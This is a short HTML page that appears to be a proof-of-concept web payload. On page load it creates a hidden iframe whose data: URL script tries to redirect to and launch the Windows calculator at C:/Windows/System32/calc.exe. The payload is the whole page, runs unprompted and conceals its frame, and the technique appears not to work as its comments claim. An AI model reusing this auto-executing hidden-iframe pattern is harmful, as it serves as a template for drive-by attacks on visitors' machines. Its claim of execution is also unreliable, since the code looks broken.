<!DOCTYPE html>
<html>
<head>
    <title>Execute calc.exe</title>
</head>
<body onload="executePayload()">
    <script>
        function executePayload() {
            // Define the URL to execute calc.exe
            var calcURL = 'data:text/html,<script>window.location.href="file:///C:/Windows/System32/calc.exe";<\/script>';

            // Create an iframe element
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none'; // Hide the iframe

            // Set the iframe's source to the calc.exe URL
            iframe.src = calcURL;

            // Append the iframe to the body to trigger the payload
            document.body.appendChild(iframe);
        }
    </script>
</body>
</html>
